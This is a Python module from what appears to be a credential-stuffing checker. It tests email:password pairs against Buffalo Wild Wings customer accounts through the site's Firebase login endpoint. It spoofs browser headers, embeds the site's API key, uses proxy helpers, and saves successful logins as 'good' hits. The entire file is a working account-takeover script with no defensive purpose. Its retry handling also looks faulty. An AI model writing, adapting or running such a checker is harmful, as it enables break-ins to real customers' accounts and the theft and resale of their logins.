from modules.variables import Checker
from requests import post
from modules.functions import log,save,set_proxy,bad_proxy

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        headers = {
            "Origin": "https://www.buffalowildwings.com" ,
            "Referer": "https://www.buffalowildwings.com/en/account/log-in/" ,
            "Sec-Fetch-Mode": "cors" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" ,
            "X-Client-Version": "Chrome/JsCore/6.6.2/FirebaseCore-web" ,
            "Content-Type":"application/json"
        }
        data = {"email":email,"password":password,"returnSecureToken":True}
        try:
            r = post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4",json=data,headers=headers,timeout=Checker.timeout)
            if r.status_code == 400:
                retries += 1
            elif r.status_code == 200:
                if not Checker.cui:
                    log("good",email+":"+password,"BWW")
                save("Buffalo Wild Wings","good",Checker.time,email+":"+password)
                Checker.good += 1
                Checker.cpm += 1
                return
            else:
                raise
        except:
            Checker.retries += 1
    Checker.bad += 1
    Checker.cpm += 1
    return